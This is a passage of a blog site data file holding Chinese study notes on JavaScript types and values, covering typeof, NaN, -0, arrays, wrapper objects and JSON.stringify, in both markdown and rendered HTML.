八进制\n0X\t\t0x\t\t\t\t\t// 十六进制\n```\nEPSILON // 最小精度\n```\nif(((0.1 + 0.2) - 0.3)<Number.EPSILON){\n}else{\n}\n```\nMAX_VALUE\nMAX_SAFE_INTEGER\n```\nNumber.MAX_VALUE\t\t\t\t\t\t// 1.7976931348623157e+308\nNumber.MAX_SAFE_INTEGER\t\t\t// 9007199254740991\n```\nisInteger\n```\nNumber.isInteger(1)\t\t\t\t\t// true\nNumber.isInteger(1.1)\t\t\t\t// false\nNumber.isInteger(1.0)\t\t\t\t// true\n```\n#### 特殊数值\n##### undefined\n```\nvar undefined = 2\nundefined \t// 2\n\n```\n_ps：永远不要重新定义undefined_\n#### void 运算符\n在不需要返回值的时候，可以void掉\n```\nif(ready){\n\treturn void setTimeout(..)\n}\n```\n这样做可以将setTimeout返回的id给void掉\n#### NaN\nNaN是一个数值型。意思指的是不是一个数值，并且NaN != NaN。可以使用isNaN来判断是否是NaN\n```\nNumber.isNaN(NaN)\t\t\t\t// true\nNumber.isNaN(1)\t\t\t\t\t// false\n\n```\n#### 0值\n加法和减法运算永远不会有-0\n使用toString和JSON.stringify()会将-0变成0\n```\n0/-1\t\t\t// -0\n0/1\t\t\t\t// 0\nvar a = -0\na \t\t\t\t// -0\na.toString()\t\t// 0\nJSON.stringify(a)\t// 0\n```\n#### 特殊等式\nObject.is\nObject.is 可以判断是+0还是-0,而且可以判断是否为NaN\n```\nObject.is(+0, -0)\t// false\nObject.is(NaN, NaN)\t\t// true\n\n```\n#### 值和引用\nnull，undefined，字符串，数字，布尔，symbol都是简单值\n对象，函数都是复杂值\n```\nfunction foo(x) {\n\tx.push(4);\t\n\tx;\t\t\t\t\t\t\t// [1,2,3,4]\n\tx = [4,5,6];\n\tx.push(7);\n\tx;\t\t\t\t\t\t\t// [4,5,6,7]\n}\nvar a = [1,2,3];\nfoo(a);\na;\t\t\t\t// [1,2,3,4]\n由于一开始是引用赋值，然后x是a对应数组的一个引用，x在push一个4之后，重新引用一个新的数组，4.5.6,而a引用的数组变化成了[1,2,3,4];\nfunction foo(x){\n\tx.push(4);\n\tx;\t\t\t\t// [1,2,3,4]\n\tx.length = 0;\t\n\tx.push(4,5,6,7)\n\tx;\t\t\t\t// [4,5,6,7]\n}\nvar a = [1,2,3]\nfoo(a)\na;\t\t// [4,5,6,7]\n和上面一开始一样，只是后面在x.length=0后，再push进去了4,5,6,7。所以x的引用没变，还是和a引用的一样。所以a和x一同变化\n```\n_ps：我们无法自行决定使用值赋值还是引用赋值，一切由值的类型决定_\n```\nfunction foo(warpper){\n\twarpper.a = 42\n}\nvar obj = {\n\ta: 1\n}\nfoo(obj)\nobj.a\t\t\t//42\nfunction foo (x) {\n\tx = x+1;\n\tx;\t\t\t\t// 3\n}\nvar a = 2;\nvar b = new Number(a);\nfoo(b)\nconsole.log(b)\t\t// 2\n前者是引用赋值，后者是值赋值\n```\n#### 原生函数\n* String\n* Number\n* Boolean\n* Array\n* Object\n* Function\n* RegExp\n* Date\n* Error\n* Symbol\n\n#### 内部属性[[Class]]\n所有typeof返回值为“Object”的对象(如数组)都包含一个内部属性[[Class]]，这个属性通常无法直接访问，一般通过Object.prototype.toString查看\n```\nObject.prototype.toString.call([123])\t\t\t// \"[object Array]\"\nObject.prototype.toString.call(null)\t\t\t// \"[object Null]\"\nObject.prototype.toString.call(true)\t\t\t// \"[object Boolean]\"\nObject.prototype.toString.call(undefined)\t// \"[object Undefined]\"\n```\n虽然Null和undefined这样的原声构造函数不存在，但是内部Class属性值仍然是Null和Undefined。基本类型值被各自的封装对象自动包装，所以他们的内部[[Class]]属性值为Boolean。\n#### 封装对象包装\n```\nvar a = \"abc\";\nconsole.log(a);\t\t// \"abc\"\na.length \t\t\t\t\t// \"3\"\nvar b = new String(\"abc\")\nconsole.log(b)\t\t// String {[[PrimitiveValue]]: \"abc\"} 0:\"a\" 1:\"b\" 2:\"c\" length:3 __proto__:String [[PrimitiveValue]]:\"abc\"\n```\n只是创建字面量基本值的时候，并没有其他的方法。当在使用其对象方法时，需要通过封装对象才能访问，此时js会自动为基本类型值包装(box或者wrap)一个封装对象。\n但是为经常用到的.length方法直接new一个对象也不是一个好办法，因为浏览器对.length这样的常见情况做了优化，直接使用封装对象来“提前优化”反而会降低执行效率。\n\n#### 封装对象的释疑\n例如：\n```\nvar a = new Boolean(false);\nif (!a){\n\tconsole.log(...)\t\t\t// 执行不到这里\n}\n```\n因为建立一个a之后，这个对象得到的是真值，得到的结果和使用false相反\n\n自行封装可以使用Object\n```\nvar a = \"abc\"\nvar b = new String (a);\nvar c = Object(a);\ntypeof a \t\t\t\t// \"stirng\"\ntypeof b\t\t\t\t// \"object\"\ntypeof c\t\t\t\t// \"object\"\nb instanceof String \t// true\nc instanceof String \t// true\nObject.prototype.toString.call(b);\t\t// \"[object String]\"\nObject.prototype.toString.call(c);\t\t// \"[object String]\"\n```\n一般不直接使用封装对象，但是他们偶尔也会派上用场\n#### 拆封\n如果想得到封装对象里面的值，可以使用valueOf函数，隐式拆封也是调用了valueOf函数：\n```\nvar a = new String(\"abc\")\nvar b = new Number(11)\nvar c = new Boolean(true)\na.valueOf()\t// \"abc\"\nb.valueOf()\t// 11\nc.valueOf()\t// true\nvar d = a + \"\";\nconsole.log(d)\t\t\t\t// \"abc\"\ntypeof a \t\t\t// \"object\"\ntypeof d \t\t\t// \"string\"\n\n```\n#### 原生函数作为构造函数\n四种方式创建应该尽量避免构造函数，除非十分必要\n* array 数组\n* object 对象\n* function 函数\n* RegExp 正则表达式\n### ARRAY(..)\n调用Array构造函数时，可以不需要加上new，效果一致。）且Array构造函数纸袋一个数字作为参数的时候，这个参数会当作数组的预设长度，而不是充当其中的一个元素\n```\n// 效果一致\nvar a = new Array(1,2,3);\na\t\t\t// [1,2,3]\nvar b = Array(1,2,3)\nb \t\t// [1,2,3]\nvar c = [1,2,3]\nc \t\t// [1,2,3]\n// 不同方式创建出来空数组效果不一致\nvar d = new Array(3);\nconsole.log(d)\t\t\t// chrome上： (3) [empty × 3]\nd.length\t\t\t\t\t\t// 3\nvar e = [undefined,undefined,undefined];\nconsole.log(e)\t\t\t// (3) [undefined, undefined, undefined]\nvar f = []\t\t\t\t\t\nf.length = 3;\nconsole.log(f);\t\t\t// chrome上： (3) [empty × 3]\n// 直接以，创建。虽然长度是3令人费解，但是可以更好的复制粘贴\nvar g = [,,,]\nconsole.log(g)\t\t\t// chrome上： (3) [empty × 3]\n\n```\n由于创建方式不同，导致在chrome下不一致的显示，但是更难过的是，他们有时相同，有时呵呵\n```\nvar a = new Array(3)\nvar b = [undefined,undefined,undefined]\na.join(\"-\")\t\t\t// \"--\"\nb.join(\"-\")\t\t\t// \"--\"\na.map(function(v,i){return i})\t\t// (3) [empty × 3]\na.map(function(v,i){return i})\t\t// [0, 1, 2]\n```\na.map之所以执行失败，是因为a中是没有元素的，而b里面有undefied。\n**而join首先假定数组不为空，然后通过length属性值来便利其中的元素，而map并不做这种假定**\n可以通过这种方式来创建包含undefined单元的数组\n```\nvar a = Array.apply(null, {length:3});\nconsole.log(a)\t\t\t// (3) [undefined, undefined, undefined]\n```\n_PS:永远不要创建和使用空单元数组_\n\n#### OBJECT、FUNCTION、REGEXP\n**除非玩不得已，尽量不要使用他们**\n```\nvar c = new Object();\nc.foo = \"bar\";\nc\t\t\t\t// {foo:\"bar\"}\nvar d = {foo:\"bar\"}\nd\t\t\t\t// {foo:\"bar\"}\nvar e = new Function(\"a\",\"return a * 2\");\nvar f = function(a){return a*2};\nfunction g(a){return a*2}\nvar h = new RegExp(\"^a*b+\",\"g\");\nvar i = /^a*b+/g\n```\njavascript对常量形式的代码会对他们进行预编译和缓存！\n#### DATE、ERROR\n相较于其他原生构造函数，Date、Error的用处比其他的更多，因为没有其他对用的常量形式来作为他们的替代\n引入生成当前时间戳，使用\n```\nDate.now()\n// 使用new来生成时间\nnew Date()\n// Thu Jan 04 2018 06:47:59 GMT+0800 (CST)\n\n```\n错误对象通常与throw一起使用\n```\nfunction foo(x){\n\tif(!x){\n\t\tthrow new Error(\"///\");\n\t}\n\t// -\n}\n```\n#### SYMBOL\nSymbol可作为私有属性是一种简单标量基本类型\n\n### 强制类型转换\n#### 抽象值操作\n如果对象有自己的toString()方法，字符串化就会调用该方法并使用其返回值。\n数组的默认toString方法经过了重新定义\n```\nvar a = [1,2,3]\na.toString()\t\t// \"1,2,3\"\n\n```\n#### JSON 字符串化\nJSON.stringify(42) // “42”\nJSON.stringify(“42”) // “”42””\nJSON.stringify(null) // “null”\nJSON.stringify(true) // “true”\n\n_JSON.stringify()在对象中遇到undefined、function和symbol时会自动将其忽略，在数组中则会返回null_\n```\nJSON.stringify(undefined)\t\t\t// undefined\nJSON.stringify(function(){})\t// undefined\nJSON.stringify([1,undefined, function(){},4])\t// \"[1,null,null,4]\"\nJSON.stringify({a:2, b: function(){}})\t\t\t\t// \"{\"a\":2}\"\n```\n循环引用会出错\n```\nvar o = {};\nvar a = {\n\tb:42,\n\tc:o,\n\td:function(){}\n}\no.e = a\nJSON.stringify(a)\na.toJSON=function(){\n\treturn {b:this.b}\n}\nJSON.stringify(a)\n# Uncaught TypeError: Converting circular structure to JSON\n#     at JSON.stringify (<anonymous>)\n#     at <anonymous>:8:6\n```","slug":"you-dont-konwn-javascript-type","published":1,"updated":"2021-10-13T15:50:29.714Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0c001v4jzxe10w6p6m","content":"<h3 id=\"类型\"><a href=\"#类型\" class=\"headerlink\" title=\"类型\"></a>类型</h3><h4 id=\"七个内置类型\"><a href=\"#七个内置类型\" class=\"headerlink\" title=\"七个内置类型\"></a>七个内置类型</h4><ul><li>空值 (null)</li><li>未定义 (undefined)</li><li>布尔值 (boolean)</li><li>数字 (number)</li><li>字符串 (string)</li><li>对象 (object)</li><li>符号 (symbol)</li></ul><h4 id=\"检测各个类型\"><a href=\"#检测各个类型\" class=\"headerlink\" title=\"检测各个类型\"></a>检测各个类型</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typeof undefined\t\t=== &quot;undefined&quot; \t// true</span><br><span class=\"line\">typeof true \t\t\t\t=== &quot;boolean&quot;\t\t\t// true</span><br><span class=\"line\">typeof 42\t\t\t\t\t\t=== &quot;number&quot;\t\t\t// true</span><br><span class=\"line\">typeof &quot;42&quot; \t\t\t\t=== &quot;string&quot;\t\t\t// true</span><br><span class=\"line\">typeof &#123;&quot;life&quot;: 42&#125;\t=== &quot;object&quot;\t\t\t// true</span><br><span class=\"line\">typeof Symbol\t\t\t\t=== &quot;symbol&quot;\t\t\t// true</span><br><span class=\"line\">typeof null \t\t\t\t=== &quot;object&quot;\t\t\t// true</span><br><span class=\"line\">typeof function()&#123;&#125;\t=== &quot;function&quot; \t\t// true</span><br><span class=\"line\">typeof [0,1]\t\t\t\t=== &quot;object&quot;\t\t\t// true</span><br></pre></td></tr></table></figure><p>本身null对象里面代表空值，所以其为object也是合理。但应该typeof null 返回是 null才符合常理。由于这个bug在许多代码中已经这样做了，所以重新修回会导致更严重的bug。因此被修回的可能性很小。<br>因此，对null应该采用复合查询语句<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = null;</span><br><span class=\"line\">(!a &amp;&amp; typeof a === &quot;object&quot;)\t// true</span><br></pre></td></tr></table></figure><p></p><p>而对于typeof function(){} === “function” 而言，因为本身function是object的一个子类型，具体的说，函数是一个可调用对象。<br>且typeof [0,1] === “object”,因为数组也是object的一个子类型</p><p><em>ps：由于所有的typeof都会返回一个string，所以 typeof typeof 42会是”string”，因为typeof 42首先会变成一个“number”，是一个string类型，所以typeof “number”是一个string</em></p><h4 id=\"undefined-amp-amp-undeclared-amp-amp-typeof-undeclared\"><a href=\"#undefined-amp-amp-undeclared-amp-amp-typeof-undeclared\" class=\"headerlink\" title=\"undefined &amp;&amp; undeclared &amp;&amp; typeof undeclared\"></a>undefined &amp;&amp; undeclared &amp;&amp; typeof undeclared</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a;</span><br><span class=\"line\">typeof a;\t\t\t// &quot;undefined&quot;</span><br><span class=\"line\">var b = 42;</span><br><span class=\"line\">var c;</span><br><span class=\"line\">b=c;</span><br><span class=\"line\">typeof c\t\t\t// &quot;undefined&quot;</span><br><span class=\"line\">typeof b\t\t\t// &quot;undefined&quot;</span><br><span class=\"line\">a\t\t\t\t\t\t\t// &quot;undefined&quot;</span><br><span class=\"line\">d\t\t\t\t\t\t\t// &quot;VM422:1 Uncaught ReferenceError: d is not defined at &lt;anonymous&gt;:1:1&quot;</span><br></pre></td></tr></table></figure><p>从上述可以看出，undefined 和 undeclared 是两码事。undefined意思是定义但未赋值，或者赋值为undefined，而undeclared是未定义。因此两者不能画等号</p><h4 id=\"typeof-undeclared\"><a href=\"#typeof-undeclared\" class=\"headerlink\" title=\"typeof undeclared\"></a>typeof undeclared</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typeof a\t\t\t// &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p>出现这种原因因为typeof有一个特殊的安全防范机制，因为多个脚本文件会在共享的全局变量命名空间中加载变量。如果typeof一个未命名的报错，会导致整段程序停止运行。对于typeof来检查undeclared变量，有时是一个不错的办法。</p><h4 id=\"值\"><a href=\"#值\" class=\"headerlink\" title=\"值\"></a>值</h4><h5 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h5><p>js的数组可以容纳任何的值，甚至可以是另一个数组，因此多维数组就是这种方式来实现的。<br>由于数组本身就是一个特殊的对象，所以数组也可以包含字符串键值和属性，但是这并不计算在数组长度内。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = [];</span><br><span class=\"line\">a[0] = 1;</span><br><span class=\"line\">a[&quot;foobar&quot;] = 1;</span><br><span class=\"line\">a.length \t\t\t// 1</span><br><span class=\"line\">a[&quot;foobar&quot;];\t// 1</span><br><span class=\"line\">a.foobar\t\t\t// 1</span><br><span class=\"line\">a[&quot;13&quot;] = 42;</span><br><span class=\"line\">a.length\t\t// 14</span><br></pre></td></tr></table></figure><p></p><p>为什么会这样呢？由于本身数组就是一个对象的子集合，因此在[]中，使用十进制字符串数字会直接强制类型转化成数字。a[“13”]就变成了a[13],因此在数组内会直接将其长度变化成14。同理，在属性给foobar加到a数组中，因为数组的界定是有数字来确定下标位置，而length是最后一个下标数字+1，因而加入的非数字就不在长度里面了。</p><h5 id=\"类数组\"><a href=\"#类数组\" class=\"headerlink\" title=\"类数组\"></a>类数组</h5><p>对于es5而言，可以用slice,concat来实现类数组转数组，对于es6而言，可以用Array.from()来实现从类数组转换成数组。</p><h5 id=\"字符串\"><a href=\"#字符串\" class=\"headerlink\" title=\"字符串\"></a>字符串</h5><p>字符串的一些方法indexOf(),concat(),toUpperCase(),reverse()等等。<br>字符串的一些方法：<br>|方法|描述|<br>|—|—|<br>|charAt() | 返回指定索引位置的字符|<br>|charCodeAt() | 返回指定索引位置字符的 Unicode 值|<br>|concat() | 连接两个或多个字符串，返回连接后的字符串|<br>|fromCharCode() | 将 Unicode 转换为字符串|<br>|indexOf() | 返回字符串中检索指定字符第一次出现的位置|<br>|lastIndexOf() | 返回字符串中检索指定字符最后一次出现的位置|<br>|localeCompare() | 用本地特定的顺序来比较两个字符串|<br>|match() | 找到一个或多个正则表达式的匹配|<br>|replace() | 替换与正则表达式匹配的子串|<br>|search() | 检索与正则表达式相匹配的值|<br>|slice() | 提取字符串的片断，并在新的字符串中返回被提取的部分|<br>|split() | 把字符串分割为子字符串数组|<br>|substr() | 从起始索引号提取字符串中指定数目的字符|<br>|substring() | 提取字符串中两个指定的索引号之间的字符|<br>|toLocaleLowerCase() | 根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射|<br>|toLocaleUpperCase() | 根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射|<br>|toLowerCase() | 把字符串转换为小写|<br>|toString() | 返回字符串对象值|<br>|toUpperCase() | 把字符串转换为大写|<br>|trim() | 移除字符串首尾空白|<br>|valueOf() | 返回某个字符串对象的原始值|</p><p>如果需要经常一字符数组的方式来处理字符串的话，倒不如直接用数组。这样就不用在字符串和数组之间来回折腾。可以在有需要的时候使用join(“”)来将字符串数组转换为字符串</p><h4 id=\"数字\"><a href=\"#数字\" class=\"headerlink\" title=\"数字\"></a>数字</h4><p>和大部分编程语言一样，js中的数字是基于IEE754标准来实现的。该标准通常也被称为“浮点数”。而js使用的是双精度单位(64位)格式。所以也会有iee754标准的通病，即浮点数之间相加会有奇妙的现象。<br>数字的一些方法：<br>toExponential()<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = 5E10\t\t\t// 可以通过这种方式赋值</span><br><span class=\"line\">a\t\t\t\t\t\t\t\t\t// 50000000000</span><br><span class=\"line\">a.toExponential()\t// &quot;5e+10&quot;</span><br><span class=\"line\">var b = a * a;</span><br><span class=\"line\">b \t\t\t\t\t\t\t\t// 2.5e+21</span><br><span class=\"line\">```\t</span><br><span class=\"line\">toFixed()\t\t\t\t\t// 精度</span><br><span class=\"line\">```bash</span><br><span class=\"line\">var a = 42.59</span><br><span class=\"line\">a.toFixed(1)\t\t\t// &quot;42.6&quot;</span><br><span class=\"line\">// 无效</span><br><span class=\"line\">42.toFixed(3)\t\t\t// Uncaught SyntaxError: Invalid or unexpected token</span><br><span class=\"line\">// 有效</span><br><span class=\"line\">42..toFixed(3)\t\t// &quot;42.000&quot;</span><br><span class=\"line\">(42).toFixed(3)\t\t// &quot;42.000&quot;</span><br><span class=\"line\">0.42.toFixed(3)\t\t// &quot;0.420&quot;</span><br><span class=\"line\">42 .toFixed(3)\t\t// &quot;42.000&quot;</span><br></pre></td></tr></table></figure><p></p><p>因为.被视为常量42.的一部分。所以没有.属性访问运算符来调用toFixed()<br>toPrecision() // 执行有效位数的显示位数<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = 42.59</span><br><span class=\"line\">a.toPrecision(1)\t\t// &quot;4e+1&quot;</span><br><span class=\"line\">a.toPrecision(2)\t\t// &quot;43&quot;</span><br><span class=\"line\">a.toPrecision(3)\t\t// &quot;42.6&quot;</span><br><span class=\"line\">``` </span><br><span class=\"line\">es6支持新格式</span><br><span class=\"line\">```bash</span><br><span class=\"line\">0B\t\t0b\t\t\t\t\t// 二进制</span><br><span class=\"line\">0O\t\t0o\t\t\t\t\t// 八进制</span><br><span class=\"line\">0X\t\t0x\t\t\t\t\t// 十六进制</span><br></pre></td></tr></table></figure><p></p><p>EPSILON // 最小精度<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(((0.1 + 0.2) - 0.3)&lt;Number.EPSILON)&#123;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>MAX_VALUE<br>MAX_SAFE_INTEGER<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Number.MAX_VALUE\t\t\t\t\t\t// 1.7976931348623157e+308</span><br><span class=\"line\">Number.MAX_SAFE_INTEGER\t\t\t// 9007199254740991</span><br></pre></td></tr></table></figure><p></p><p>isInteger<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Number.isInteger(1)\t\t\t\t\t// true</span><br><span class=\"line\">Number.isInteger(1.1)\t\t\t\t// false</span><br><span class=\"line\">Number.isInteger(1.0)\t\t\t\t// true</span><br></pre></td></tr></table></figure><p></p><h4 id=\"特殊数值\"><a href=\"#特殊数值\" class=\"headerlink\" title=\"特殊数值\"></a>特殊数值</h4><h5 id=\"undefined\"><a href=\"#undefined\" class=\"headerlink\" title=\"undefined\"></a>undefined</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var undefined = 2</span><br><span class=\"line\">undefined \t// 2</span><br></pre></td></tr></table></figure><p><em>ps：永远不要重新定义undefined</em></p><h4 id=\"void-运算符\"><a href=\"#void-运算符\" class=\"headerlink\" title=\"void 运算符\"></a>void 运算符</h4><p>在不需要返回值的时候，可以void掉<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(ready)&#123;</span><br><span class=\"line\">\treturn void setTimeout(..)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>这样做可以将setTimeout返回的id给void掉</p><h4 id=\"NaN\"><a href=\"#NaN\" class=\"headerlink\" title=\"NaN\"></a>NaN</h4><p>NaN是一个数值型。意思指的是不是一个数值，并且NaN != NaN。可以使用isNaN来判断是否是NaN<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Number.isNaN(NaN)\t\t\t\t// true</span><br><span class=\"line\">Number.isNaN(1)\t\t\t\t\t// false</span><br></pre></td></tr></table></figure><p></p><h4 id=\"0值\"><a href=\"#0值\" class=\"headerlink\" title=\"0值\"></a>0值</h4><p>加法和减法运算永远不会有-0<br>使用toString和JSON.stringify()会将-0变成0<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0/-1\t\t\t// -0</span><br><span class=\"line\">0/1\t\t\t\t// 0</span><br><span class=\"line\">var a = -0</span><br><span class=\"line\">a \t\t\t\t// -0</span><br><span class=\"line\">a.toString()\t\t// 0</span><br><span class=\"line\">JSON.stringify(a)\t// 0</span><br></pre></td></tr></table></figure><p></p><h4 id=\"特殊等式\"><a href=\"#特殊等式\" class=\"headerlink\" title=\"特殊等式\"></a>特殊等式</h4><p>Object.is<br>Object.is 可以判断是+0还是-0,而且可以判断是否为NaN<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.is(+0, -0)\t// false</span><br><span class=\"line\">Object.is(NaN, NaN)\t\t// true</span><br></pre></td></tr></table></figure><p></p><h4 id=\"值和引用\"><a href=\"#值和引用\" class=\"headerlink\" title=\"值和引用\"></a>值和引用</h4><p>null，undefined，字符串，数字，布尔，symbol都是简单值<br>对象，函数都是复杂值<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(x) &#123;</span><br><span class=\"line\">\tx.push(4);\t</span><br><span class=\"line\">\tx;\t\t\t\t\t\t\t// [1,2,3,4]</span><br><span class=\"line\">\tx = [4,5,6];</span><br><span class=\"line\">\tx.push(7);</span><br><span class=\"line\">\tx;\t\t\t\t\t\t\t// [4,5,6,7]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = [1,2,3];</span><br><span class=\"line\">foo(a);</span><br><span class=\"line\">a;\t\t\t\t// [1,2,3,4]</span><br><span class=\"line\">由于一开始是引用赋值，然后x是a对应数组的一个引用，x在push一个4之后，重新引用一个新的数组，4.5.6,而a引用的数组变化成了[1,2,3,4];</span><br><span class=\"line\">function foo(x)&#123;</span><br><span class=\"line\">\tx.push(4);</span><br><span class=\"line\">\tx;\t\t\t\t// [1,2,3,4]</span><br><span class=\"line\">\tx.length = 0;\t</span><br><span class=\"line\">\tx.push(4,5,6,7)</span><br><span class=\"line\">\tx;\t\t\t\t// [4,5,6,7]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = [1,2,3]</span><br><span class=\"line\">foo(a)</span><br><span class=\"line\">a;\t\t// [4,5,6,7]</span><br><span class=\"line\">和上面一开始一样，只是后面在x.length=0后，再push进去了4,5,6,7。所以x的引用没变，还是和a引用的一样。所以a和x一同变化</span><br></pre></td></tr></table></figure><p></p><p><em>ps：我们无法自行决定使用值赋值还是引用赋值，一切由值的类型决定</em><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(warpper)&#123;</span><br><span class=\"line\">\twarpper.a = 42</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta: 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(obj)</span><br><span class=\"line\">obj.a\t\t\t//42</span><br><span class=\"line\">function foo (x) &#123;</span><br><span class=\"line\">\tx = x+1;</span><br><span class=\"line\">\tx;\t\t\t\t// 3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = 2;</span><br><span class=\"line\">var b = new Number(a);</span><br><span class=\"line\">foo(b)</span><br><span class=\"line\">console.log(b)\t\t// 2</span><br><span class=\"line\">前者是引用赋值，后者是值赋值</span><br></pre></td></tr></table></figure><p></p><h4 id=\"原生函数\"><a href=\"#原生函数\" class=\"headerlink\" title=\"原生函数\"></a>原生函数</h4><ul><li>String</li><li>Number</li><li>Boolean</li><li>Array</li><li>Object</li><li>Function</li><li>RegExp</li><li>Date</li><li>Error</li><li>Symbol</li></ul><h4 id=\"内部属性-Class\"><a href=\"#内部属性-Class\" class=\"headerlink\" title=\"内部属性[[Class]]\"></a>内部属性[[Class]]</h4><p>所有typeof返回值为“Object”的对象(如数组)都包含一个内部属性[[Class]]，这个属性通常无法直接访问，一般通过Object.prototype.toString查看<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.toString.call([123])\t\t\t// &quot;[object Array]&quot;</span><br><span class=\"line\">Object.prototype.toString.call(null)\t\t\t// &quot;[object Null]&quot;</span><br><span class=\"line\">Object.prototype.toString.call(true)\t\t\t// &quot;[object Boolean]&quot;</span><br><span class=\"line\">Object.prototype.toString.call(undefined)\t// &quot;[object 